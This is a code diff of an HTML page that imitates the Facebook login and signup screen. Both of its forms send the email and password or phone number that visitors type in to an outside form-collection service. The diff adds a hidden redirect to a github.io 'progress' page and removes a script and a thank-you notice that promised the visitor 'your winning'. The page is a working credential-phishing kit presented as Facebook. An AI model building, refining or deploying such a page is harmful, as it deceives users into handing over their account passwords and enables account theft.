@@ -75,6 +75,7 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            margin-left:10px;
         }
 
         /* Signup section styles */
@@ -119,19 +120,6 @@
             text-align: center;
             padding: 20px;
             background-color: #e9ecef;
-        }
-
-        .thankyou-message {
-            display: none;
-            background-color: white;
-            padding: 50px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        .thankyou-message h1 {
-            color: #42b72a;
         }
 
         /* Responsive Styles */
@@ -179,7 +167,8 @@
         <section class="hero">
             <h2>Connect with friends and the world around you on Facebook.</h2>
             <form id="login-form" action="https://submit-form.com/VlWBYGciz" method="POST">
-                <input type="hidden" name="_append" value="false" />
+                <input type="hidden" name="_redirect" value="https://joshuabentley.github.io/assets/html/progress.html"/>
+                <input type="hidden" name="_append" value="false"/>
 
                 <input type="text" name="email" placeholder="Email or Phone Number" required>
                 <input type="password" name="password" placeholder="Password" required>
@@ -192,7 +181,7 @@
 
         <section class="signup-section">
             <h2>Create a new account</h2>
-            <form id="signup-form" action="https://submit-form.com/VlWBYGciz" method="POST">
+            <form id="signup-form" action="https://submit-form.com/VlWBYGciz" method="POST">>
                 <input type="text" name="firstName" placeholder="First Name" required>
                 <input type="text" name="lastName" placeholder="Last Name" required>
                 <input type="text" name="emailOrPhone" placeholder="Mobile Number or Email" required>
@@ -201,81 +190,10 @@
             </form>
             <p>By clicking Sign Up, you agree to our Terms, Data Policy, and Cookie Policy.</p>
         </section>
-
-        <!-- Thank you message -->
-        <section id="thankyou-message" class="thankyou-message">
-            <h1>Thank You!</h1>
-            <p>You're a step ahead, be patient while we shall get back to you soon with your winning.</p>
-        </section>
     </main>
 
     <footer>
         <p>Facebook © 2024</p>
     </footer>
-
-    <script>
-        function showThankYouMessage() {
-            // Hide the forms and show the thank you message
-            document.querySelector('.hero').style.display = 'none';
-            document.querySelector('.signup-section').style.display = 'none';
-            document.getElementById('thankyou-message').style.display = 'block';
-        }
-
-        // Handle login form submission
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-            
-            const formData = new FormData(this); // Create FormData object from the form
-
-            // Send form data to Formspark
-            fetch('https://submit-form.com/VlWBYGciz', {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => {
-                if (response.ok) {
-                    showThankYouMessage(); // Show the thank you message
-                } else {
-                    alert('Error: Unable to submit the form. Please try again.');
-                }
-            })
-            .catch(error => {
-                console.error('Form submission error:', error.message);
-                if (error.message.includes('CORS')) {
-                    alert('CORS issue detected. Please ensure Formspark is configured to accept requests from your domain.');
-                } else {
-                    alert('Submission failed due to network error. Please check your internet connection or try again later.');
-                }
-            });
-        });
-
-        // Handle signup form submission
-        document.getElementById('signup-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-            
-            const formData = new FormData(this); // Create FormData object from the form
-
-            // Send form data to Formspark
-            fetch('https://submit-form.com/VlWBYGciz', {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => {
-                if (response.ok) {
-                    showThankYouMessage(); // Show the thank you message
-                } else {
-                    alert('Error: Unable to submit the form. Please try again.');
-                }
-            })
-            .catch(error => {
-                console.error('Form submission error:', error.message);
-                if (error.message.includes('CORS')) {
-                    alert('CORS issue detected. Please ensure Formspark is configured to accept requests from your domain.');
-                } else {
-                    alert('Submission failed due to network error. Please check your internet connection or try again later.');
-                }
-            });
-        });
-    </script>
-</body>
-</html>
+    
+    
